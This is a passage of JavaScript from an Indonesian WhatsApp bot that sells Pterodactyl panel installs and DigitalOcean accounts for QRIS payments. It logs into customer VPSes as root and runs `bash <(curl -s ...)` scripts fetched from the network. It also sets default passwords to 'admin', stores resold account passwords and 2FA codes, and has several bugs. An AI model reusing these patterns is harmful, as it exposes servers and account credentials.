if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}

}
}
break

case "installbuyyer2": {
 if (!m.isGroup) return Reply("Instalasi tema hanya dapat dilakukan melalui private chat.");
 if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

 function generateRandomNumber(min, max) {
 return Math.floor(Math.random() * (max - min + 1)) + min;
 }

 let amount = 6000 + generateRandomNumber(0, 0);

 // Updated API request to use new URL and API key
 const get = await axios.get(`https://www.api-nvidia.web.id/orderkuota/createpayment?apikey=${global.apiSimpelBot}&amount=${amount}&codeqr=${qrisOrderKuota}`);

 const teksPembayaran = `
 *▧ INFORMASI PEMBAYARAN*

 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Install Panel Pterodactyl
 *• Expired :* 5 menit

 *Note :*
 QRIS pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis melanjutkan instalasi tema.
 `

 let msgQr = await Nvidia.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
        db.users[m.sender].status_deposit = true;
        db.users[m.sender].saweria = {
            msg: msgQr,
            chat: m.sender,
            idDeposit: get.data.result.transactionId,
            amount: get.data.result.amount.toString(),
            exp: function () {
                setTimeout(async () => {
                    if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
                        await Nvidia.sendMessage(db.users[m.sender].saweria.chat, {text: "⚠️ Waktu pembayaran telah expired, transaksi dibatalkan!"}, {quoted: db.users[m.sender].saweria.msg});
                        await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                        db.users[m.sender].status_deposit = false;
                        await clearInterval(db.users[m.sender].saweria.exp);
                        delete db.users[m.sender].saweria;
                    }
                }, 300000); // 5 menit
            }
        };

 await db.users[m.sender].saweria.exp();

 while (db.users[m.sender].status_deposit) {
 await sleep(8000);
 
 // Updated API request to check the payment status using new API URL and API key
 const resultcek = await axios.get(`https://www.api-nvidia.web.id/orderkuota/cekstatus?apikey=${global.apiSimpelBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
 const req = await resultcek.data.amount;
 if (req == db.users[m.sender].saweria.amount) {
 db.users[m.sender].status_deposit = false;

 await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { text: "Pembayaran berhasil! Memulai instalasi panel" }, { quoted: db.users[m.sender].saweria.msg });
 delete db.users[m.sender].saweria; 

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*📦 Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await Nvidia.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('New York\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By FR3botz\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By FR3botz\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}

}
}
break

case "jasainstallpanel":
{
 if (!text || !text.split("|")) return Reply(example("ipvps|pwvps|domain.com|node.com|ram"));
 let vii = text.split("|");
 if (vii.length < 2) return Reply(example("ipvps|pwvps|domain.com|node.com|ram"));
 
 global.installpanell = {
 vps: vii[0], 
 pwvps: vii[1],
 domain: vii[2],
 nodedomain: [3],
 rampanel: [4]
 };

 let jasa = `
 *_Silahkan Pilih Veri Panel Dan Region (Lokasi)_*
 `;

 let buttons = [
 { buttonId: ".owner", buttonText: { displayText: "ᴏᴡɴᴇʀ" } },
 { buttonId: ".ping", buttonText: { displayText: "ɪɴғᴏ ʙᴏᴛ" } }
 ];

 let buttonMessage = {
 image: {
 url: "https://img5.pixhost.to/images/2824/565962876_fr3hosting.jpg",
 gifPlayback: true, 
 },
 caption: `${jasa}`,
 contextInfo: {
 forwardingScore: 999,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.idSaluran,
 newsletterName: `FR3 HOSTING`
 }
 },
 footer: "FR3 HOSTING",
 buttons: buttons,
 viewOnce: true,
 headerType: 6
 };

 const flowActions = [
 {
 buttonId: 'action',
 buttonText: { displayText: 'This Button List' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: "FR3 HOSTING",
 sections: [
 {
 title: "sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ᴍᴇɴᴜ",
 highlight_label: "Recommended",
 rows: [
 { title: "Region Singapore", description: "RP 5.000", id: ".installbuyyer1" },
 { title: "Region NewYork", description: "RP 6.000", id: ".installbuyyer2" }
 ]
 }
 ]
 })
 },
 viewOnce: true
 }
 ];

 buttonMessage.buttons.push(...flowActions);

 await Nvidia.sendMessage(m.chat, buttonMessage, { quoted: qlive }); // Use `m` here instead of `fkontak`
 };

break;

case "ambilsw": case "sw": {
 if (!m.isGroup) return m.reply("❌ Command ini hanya bisa digunakan di chat pribadi!");

 const quotedMessage = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
 if (!quotedMessage) return m.reply("📌 Balas pesan gambar/video yang ingin diambil!");

 if (quotedMessage.imageMessage) {
 let imageUrl = await Nvidia.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
 return Nvidia.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
 }

 if (quotedMessage.videoMessage) {
 let videoUrl = await Nvidia.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
 return Nvidia.sendMessage(m.chat, { video: { url: videoUrl } }, { quoted: m });
 }

 return m.reply("❌ Hanya bisa mengambil gambar atau video dari pesan yang dikutip!");
}

break

case "cetakqr":
 case "qrtext": {
 if(!text) return m.reply("Masukan Teks Untuk Dijadikan Qr");
 m.reply(mess.wait);
 let anu = `https://api.siputzx.my.id/api/tools/text2qr?text=${encodeURIComponent(text)}`;
 const response = await axios.get(anu, { responseType: 'arraybuffer' });
 try {
 Nvidia.sendMessage(m.chat, {
 image: Buffer.from(response.data),
 caption: '_Sudah Dijadikan Qr_'
 }, { quoted: m })
 } catch (e) {
 console.log(e);
 await m.reply('Error')
 }
 }
 break

case "cekgempa": {
 m.reply("Sedang mengambil data gempa terkini...");
 
 try {
 const response = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json");
 const data = await response.json();
 
 if (!data || !data.Infogempa || !data.Infogempa.gempa) {
 return m.reply("Gagal mendapatkan data gempa dari BMKG.");
 }
 
 const gempa = data.Infogempa.gempa;
 
 let caption = `*📈 INFO GEMPA TERKINI*\n\n`;
 caption += `*Tanggal:* ${gempa.Tanggal}\n`;
 caption += `*Waktu:* ${gempa.Jam}\n`;
 caption += `*Magnitudo:* ${gempa.Magnitude}\n`;
 caption += `*Kedalaman:* ${gempa.Kedalaman}\n`;
 caption += `*Lokasi:* ${gempa.Wilayah}\n`;
 caption += `*Koordinat:* ${gempa.Lintang} ${gempa.Bujur}\n`;
 caption += `*Potensi:* ${gempa.Potensi}\n`;
 caption += `*Dirasakan:* ${gempa.Dirasakan}\n\n`;
 caption += `Sumber: BMKG (https://www.bmkg.go.id/)`;
 
 if (gempa.Shakemap) {
 const shakemapUrl = `https://data.bmkg.go.id/DataMKG/TEWS/${gempa.Shakemap}`;
 await Nvidia.sendMessage(m.chat, {
 image: { url: shakemapUrl },
 caption: caption
 }, { quoted: m });
 } else {
 Nvidia.sendMessage(m.chat, { text: caption }, { quoted: m });
 }
 } catch (error) {
 console.log(error);
 m.reply("Terjadi kesalahan saat mengambil data gempa.");
 }
}
break

case "donate": case "deposit": {
if (m.isGroup) return m.reply("Pembelian hanya bisa dilakukan di private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")

let teks = `
*#- Masukkan nominal donate yang ingin dilakukan*
Contoh penggunaan: *.donete* 5000
`
if (!text) return m.reply(teks)

let amount = Number(text)
if (isNaN(amount) || amount <= 0) return m.reply("Nominal yang dimasukkan tidak valid. Harap masukkan jumlah yang benar.")
const UrlQr = global.qrisOrderKuota
const adjustedAmount = amount + generateRandomNumber(110, 250)

const get = await axios.get(`https://rafaelxd.tech/api/orkut/createpayment?apikey=rafael&amount=${amount}&codeqr=${UrlQr}}`)
const teks3 = `
*▧ INFORMASI PEMBAYARAN*

*• ID :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Expired :* 5 menit

*Note :* 
QRIS pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`

let msgQr = await Nvidia.sendMessage(m.chat, {
 footer: `2025 ${botname}`,
 buttons: [
 {
 buttonId: `.batalbeli`,
 buttonText: { displayText: 'Batalkan Pembelian' },
 type: 1
 }
 ],
 headerType: 1,
 viewOnce: true,
 image: {url: get.data.result.qrImageUrl}, 
 caption: teks3,
 contextInfo: {
 mentionedJid: [m.sender]
 },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await Nvidia.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000) 
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
            await sleep(8000);
            const resultcek = await axios.get(`https://rafaelxd.tech/api/orkut/cekstatus?apikey=rafael&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
            const req = await resultcek.data;

            if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
                db.users[m.sender].status_deposit = false;
                await clearInterval(db.users[m.sender].saweria.exp);
                await Nvidia.sendMessage(db.users[m.sender].saweria.chat, {text: `
                ✅ *PEMBAYARAN BERHASIL!*

                *💳 ID Transaksi :* ${db.users[m.sender].saweria.idDeposit}
                *💰 Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}

                🎉 *Selamat, Pembelian kamu berhasil diproses!*
            `},
{quoted: db.users[m.sender].saweria.msg})
       }
     }
   }
break

case "cekpanel": {
if (!text) return m.reply('*-# Masukkan Panel* ID\nContoh: .cekpanel 1234');
const panelId = text;

try {
const response = await fetch(`${global.domain}/api/application/servers`, {
method: "GET",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${global.apikey}`
}
});

if (!response.ok) {
throw new Error(`Failed to fetch servers: ${response.status}`);
}
const resData = await response.json();

const server = resData.data.find(s => s.attributes.id === parseInt(panelId));

if (!server) {
return m.reply(`*🔴 -# Server Panel Id Tidak Valid ${panelId}*`);
}
const serverAttributes = server.attributes;
const usageResponse = await fetch(`${global.domain}/api/client/servers/${serverAttributes.uuid.split('-')[0]}/resources`, {
method: "GET",
headers: {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": `Bearer ${global.capikey}`
}
});
if (!usageResponse.ok) {
throw new Error(`Failed to fetch resource usage: ${usageResponse.status}`);
}
const usageData = await usageResponse.json();
const formatSize = (size) => {
if (!size || size === 0) return "Unlimited";
if (size >= 1024) {
return `${Math.floor(size/1024)}GB`;
}
return `${size}MB`;
};
const formatCPU = (cpu) => {
return !cpu || cpu === 0 ? "Unlimited" : `${cpu}%`;
};
const formatNetworkSpeed = (bytes) => {
if (!bytes) return "0 KB/s";
const kb = bytes / 1024;
return `${kb.toFixed(2)} KB/s`;
};
const getStatus = (state) => {
const statusMap = {
'running': '?? Running',
'starting': '🟡 Starting',
'stopping': '🟡 Stopping',
'stopped': '🔴 Stopped',
'offline': '⚫ Offline'
};
return statusMap[state.toLowerCase()] || `❓ ${state}`;
};
let message = `📊 *-# Detail Server Panel Anda*
* *-# Nama:* ${serverAttributes.name}
* *-# Panel ID:* ${serverAttributes.id}\n
${getStatus(usageData.attributes.current_state)}

📊 *[ - ] Detail Resource Usage: [ - ]*
* *-# CPU:* ${formatCPU(serverAttributes.limits.cpu)}
* *-# RAM:* ${formatSize(serverAttributes.limits.memory)}
* *-# Disk:* ${formatSize(serverAttributes.limits.disk)}
* *-# Upload:* ${formatNetworkSpeed(usageData.attributes.resources.network_rx_bytes)}
* *-# Download:* ${formatNetworkSpeed(usageData.attributes.resources.network_tx_bytes)}

*[ - ] Jika Mau Cek Panel Anda Lagi silahkan : .cekpanel [ - ]*`;

await Nvidia.sendMessage(m.chat, {image: {url: "https://i.postimg.cc/wvH7FBgQ/Warungerik.jpg" }, caption: message }, {quoted: qtext})

} catch (error) {
console.error('Error detail:', error);
return m.reply(`❌ Terjadi kesalahan: ${error.message}`);
}}
break

case "payauto": case "sqris": {
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")

let teks = `
*#- Masukkan nominal deposit yang ingin dilakukan*
Contoh penggunaan: *.sent_qris* 5000
`
if (!text) return m.reply(teks)

let amount = Number(text)
if (isNaN(amount) || amount <= 0) return m.reply("Nominal yang dimasukkan tidak valid. Harap masukkan jumlah yang benar.")
const UrlQr = global.qrisOrderKuota
const adjustedAmount = amount + generateRandomNumber(110, 250)

const get = await axios.get(`https://rafaelxd.tech/api/orkut/createpayment?apikey=rafael&amount=${amount}&codeqr=${UrlQr}}`)
const teks3 = `
*▧ INFORMASI PEMBAYARAN*

*• ID :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Expired :* 5 menit

*Note :* 
QRIS pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`

let msgQr = await Nvidia.sendMessage(m.chat, {
 footer: `2025 ${botname}`,
 buttons: [
 {
 buttonId: `.batalbeli`,
 buttonText: { displayText: 'Batalkan Pembelian' },
 type: 1
 }
 ],
 headerType: 1,
 viewOnce: true,
 image: {url: get.data.result.qrImageUrl}, 
 caption: teks3,
 contextInfo: {
 mentionedJid: [m.sender]
 },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await Nvidia.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000) 
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
 await sleep(8000);
 const resultcek = await axios.get(`https://rafaelxd.tech/api/orkut/cekstatus?apikey=rafael&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
 const req = await resultcek.data;

 if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
 db.users[m.sender].status_deposit = false;
 await clearInterval(db.users[m.sender].saweria.exp);
 await Nvidia.sendMessage(db.users[m.sender].saweria.chat, {text: `
 ✅ *PEMBAYARAN BERHASIL!*

 *💳 ID Transaksi :* ${db.users[m.sender].saweria.idDeposit}
 *💰 Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}

 🎉 *Selamat, Pembelian kamu berhasil diproses!*
 `},
{quoted: db.users[m.sender].saweria.msg})
 }
 }
 }
break

case "addidch": case "addch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idchnya"))
if (!text.endsWith("@newsletter")) return m.reply("Id channel tidak valid")
let input = text
if (listidch.includes(input)) return m.reply(`Id ${input2} sudah terdaftar!`)
listidch.push(input)
await fs.writeFileSync("./library/database/listidch.json", JSON.stringify(listidch, null, 2))
m.reply(`Berhasil menambah id channel kedalam database ✅`)
}
break

case "delidch":
case "delch": {
  if (!isCreator) return Reply(mess.owner)
  if (listidch.length < 1) return m.reply("❌ Tidak ada id channel di database")

  // Membuat sections
  const sections = [
    {
      title: "📂 LIST ID CHANNEL TERDAFTAR",
      highlight_label: "🗑️ Hapus Channel",
      rows: listidch.map(id => ({
        title: id,
        description: "Klik untuk menghapus ID ini dari database",
        id: `.delidchconfirm ${id}`
      }))
    }
  ]

  const pesan = `╭─── 〔 *🗑️ HAPUS CHANNEL* 〕 ───╮\n` +
                 `📜 *Total ID Channel:* ${listidch.length}\n\n` +
                 `🔹 Pilih ID channel yang ingin dihapus:\n` +
                 `⚡ *Klik tombol di bawah!* 👇\n` +
                 `╰────────────────────────╯`

  await Nvidia.sendMessage(m.chat, {
    buttons: [
      {
        buttonId: 'pilih-channel',
        buttonText: { displayText: '🗑️ Pilih ID' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: "🗑️ Pilih ID Channel",
            sections: sections
          })
        }
      }
    ],
    footer: "®FR3 DEV",
    headerType: 1,
    viewOnce: true,
    text: pesan
  }, { quoted: m })
}
break

// Konfirmasi dan hapus
case "delidchconfirm": {
  if (!isCreator) return Reply(mess.owner)
  if (!text.endsWith("@newsletter")) return m.reply("❌ ID channel tidak valid")

  const input = text
  if (!listidch.includes(input)) return m.reply(`❌ ID ${input} tidak terdaftar!`)

  // Hapus
  const pos = listidch.indexOf(input)
  listidch.splice(pos, 1)
  await fs.writeFileSync("./library/database/listidch.json", JSON.stringify(listidch, null, 2))
  m.reply(`✅ Berhasil menghapus ID channel: ${input}`)
}
break

case "listidch": case "listch": {
if (listidch.length < 1) return m.reply("Tidak ada id channel di database")
let teks = ` *── List all id channel*\n`
for (let i of listidch) {
teks += `\n* ${i}\n`
}
Nvidia.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

case "addidch2":
case "addch2": {
    if (!isCreator) return Reply(mess.owner)
    let input = m.chat // ambil id channel dari metadata chat
    if (!input.endsWith("@newsletter")) return m.reply("Fitur Ini Khusus Di Dalam Channel Wa!")
    if (listidch.includes(input)) return m.reply(`Id ${input} sudah terdaftar!`)
 
    listidch.push(input)
    await fs.writeFileSync("./library/database/listidch.json", JSON.stringify(listidch, null, 2))
    m.reply(`Berhasil menambah id channel ${input} kedalam database ✅`)
}
break

case "adddo": case "addstokdo": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("fr3@gmail.com|password|kode2fa|kodereferal|drop(contoh 3)|harga(contoh 130000)"))
if (!text.split("|")) return m.reply(example("skyzo@gmail.com|password|kode2fa|kodereferal|drop(contoh 3)|harga(contoh 130000)"))
const cek = text.split("|")
if (cek.length < 5) return m.reply(example("skyzo@gmail.com|password|kode2fa|kodereferal|drop(contoh 3)|harga(contoh 130000)"))
let [email, pw, kode2fa, reff, droplet, harga] = text.split("|")
stokdo.push({
email: email, 
password: pw, 
kode2fa: kode2fa, 
referall: reff, 
droplet: droplet, 
harga: Number(harga)
})
await fs.writeFileSync("./library/database/stokdo.json", JSON.stringify(stokdo, null, 2))
await m.reply("Berhasil menambah data stok digitalocean ✅")
}
break
 
case "delstokdo": case "deldo": {
if (!isCreator) return Reply(mess.owner)
if (stokdo.length < 1) return m.reply("Tidak ada stok")
if (text == "all") {
await stokdo.splice(0, stokdo.length)
await fs.writeFileSync("./library/database/stokdo.json", JSON.stringify(stokdo, null, 2))
return m.reply(`Berhasil menghapus semua stok data akun digitalocean ✅`)
}
if (!text || isNaN(text)) return m.reply(example("idnya\n\nKetik *.liststokdo* untuk lihat id"))
if (Number(text) > stokdo.length) return m.reply("Id stok tidak ditemukan")
let inx = Number(text) - 1
stokdo.splice(inx, 1)
await fs.writeFileSync("./library/database/stokdo.json", JSON.stringify(stokdo, null, 2))
await m.reply("Berhasil menghapus data stok digitalocean ✅")
}
break

case "liststokdo": case "listdo": {
if (!isCreator) return Reply(mess.owner)
if (stokdo.length < 1) return m.reply("Tidak ada stok")
//if (!m.isGroup) return Reply(mess.private)
let messageText = "\n *── List stok akun digital ocean*\n"
let count = 0
for (let res of stokdo) {
messageText += `\n*ID Stok :* ${count += 1}
*Email :* ${res.email}
*Password :* ${res.password}
*Kode 2FA :* ${res.kode2fa}
*Referall :* ${res.referall}
*Harga :* Rp${await toIDR(res.harga.toString())}
*Droplet :* ${res.droplet}\n`
}
return m.reply(messageText)
}
break

case "buydigitalocean": case "buydo": {
if (stokdo.length < 1) return m.reply("Maaf stok do sedang tidak tersedia")
if (m.isGroup) return m.reply("Pembelian digitalocean hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) {
let butnya = []
let urutt = 0
for (let gg of stokdo) {
butnya.push({
title: `${gg.droplet} Droplet`, 
description: `Rp${await toIDR(gg.harga)}`, 
id: `.buydo ${urutt += 1}`
})
}
return Nvidia.sendMessage(m.chat, {
 buttons: [
 {
 buttonId: 'action',
 buttonText: { displayText: 'ini pesan interactiveMeta' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: 'Pilih Droplet',
 sections: [
 {
 title: 'List Stok Digitalocean',
 highlight_label: 'Recommended',
 rows: butnya
 }
 ]
 })
 }
 }
 ],
 footer: `© 2025 ${botname}`,
 headerType: 1,
 viewOnce: true,
 text: "Pilih Stock Digitalocean\n",
 contextInfo: {
 isForwarded: true, 
 mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
 },
}, {quoted: m})
}

const donya = stokdo[Number(text) - 1]
let us = crypto.randomBytes(4).toString('hex')
let Obj = {}
Obj.harga = donya.harga
Obj.akun = donya
const UrlQr = global.qrisOrderKuota
const amount = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://rafaelxd.tech/api/orkut/createpayment?apikey=rafael&amount=${amount}&codeqr=${UrlQr}}`)
const teks3 = `
*── INFORMASI PEMBAYARAN*
 
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Digitalocean ${donya.droplet} Drop
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await Nvidia.sendMessage(m.chat, {
 footer: `© 2025 ${botname}`,
 buttons: [
 {
 buttonId: `.batalbeli`,
 buttonText: { displayText: 'Batalkan Pembelian' },
 type: 1
 }
 ],
 headerType: 1,
 viewOnce: true,
 image: {url: get.data.result.qrImageUrl}, 
 caption: teks3,
 contextInfo: {
 mentionedJid: [m.sender]
 },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await Nvidia.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
